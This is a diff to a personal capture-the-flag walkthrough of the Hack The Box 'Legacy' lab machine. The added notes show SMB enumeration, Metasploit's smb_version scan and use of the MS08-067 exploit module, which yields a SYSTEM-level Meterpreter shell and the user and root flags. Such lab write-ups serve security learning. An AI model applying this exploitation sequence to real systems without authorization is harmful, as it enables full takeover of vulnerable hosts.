@@ -39,8 +39,35 @@ Nmap done: 1 IP address (1 host up) scanned in 63.38 seconds
 
 #### Initial Ideas and Reactions
 
- - Windows XP / 2000 machine
+ - Windows XP machine
  - port 139 is smb server
   - message signing disabled, guest account, auth level user
  - 445 Windows File Sharing and other MS services
  - 3389 CLOSED ms-wbt-server
+
+
+Attempted to use `smbclient -L` along with `-U`, `-p`, `-I` etc to try to connect to 139 and 445. No dice. Ran `msfconsole` and `/scanner/smb/smb_version`:
+
+```shell
+msf5 auxiliary(scanner/smb/smb_version) > run
+
+[+] 10.10.10.4:445        - Host is running Windows XP SP3 (language:English) (name:LEGACY) (workgroup:HTB ) (signatures:optional)
+```
+
+Following along with CyberMentor I `msf5 > search windows/smb` and `use windows/smb/ms08_067_netap`
+
+```powershell
+meterpreter > sysinfo
+Computer        : LEGACY
+OS              : Windows XP (5.1 Build 2600, Service Pack 3).
+Architecture    : x86
+System Language : en_US
+Domain          : HTB
+Logged On Users : 1
+Meterpreter     : x86/windows
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+From here I was able to navigate to `C:\Documents and Settings\john\Desktop` to find the user flag. And into `Administrator` for the root flag.
